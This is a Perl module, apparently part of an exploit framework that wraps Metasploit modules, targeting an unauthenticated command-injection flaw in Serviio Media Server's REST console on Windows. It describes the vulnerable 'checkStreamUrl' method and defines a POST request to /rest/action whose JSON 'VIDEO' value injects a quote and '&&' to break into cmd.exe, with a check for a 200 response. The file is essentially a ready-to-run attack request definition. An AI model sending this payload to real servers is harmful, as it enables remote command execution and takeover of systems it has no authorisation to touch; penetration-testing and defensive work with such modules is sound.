package MSFExploits::Exploits::SERVIIO::MSF::ServiioCheckstreamurlCmdExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::SERVIIO);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ServiioCheckstreamurlCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits an unauthenticated remote command execution vulnerability

        in the console component of Serviio Media Server versions 1.4 to 1.8 on

        Windows operating systems.



        The console service (on port 23423 by default) exposes a REST API which

        which does not require authentication.



        The 'action' API endpoint does not sufficiently sanitize user-supplied data

        in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is

        used in a call to cmd.exe resulting in execution of arbitrary commands.



        This module has been tested successfully on Serviio Media Server versions

        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.

      ",
  MSF_MODULE => "serviio_checkstreamurl_cmd_exec",
  OSVDB => 41961,
  REFERENCES => [
    "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php",
    "https://blogs.securiteam.com/index.php/archives/3094",
  ],
  TITLE => "checkStreamUrl",


  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'rest/action',
      PAYLOAD      => '{"name":"checkStreamUrl","parameter":["VIDEO","\" \u0026\u0026"]}',
      TEXT   => 'Sending Exploit #1 Request : [POST] /rest/action',
      HEADERS      => {
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
